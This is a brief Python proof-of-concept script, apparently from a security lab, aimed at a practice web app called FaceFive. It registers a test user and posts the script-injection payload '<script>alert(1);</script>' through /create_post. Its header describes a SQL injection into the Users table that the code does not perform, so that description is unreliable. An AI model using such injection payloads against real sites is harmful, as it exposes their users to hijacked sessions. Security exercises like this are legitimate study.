# vuln3.py

# PoC for SQL injection on the /create_post endpoint to change fields in the `Users` table
#
# The update profile section fields to change the user's name, password, bio and image allow us to change values in the `Users` table

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'
content = '<script>alert(1);</script>'

reset_image(session)
register(session, user, passwd)

#post = script(session, content)
post = create_post(session, content)
print(post.text)

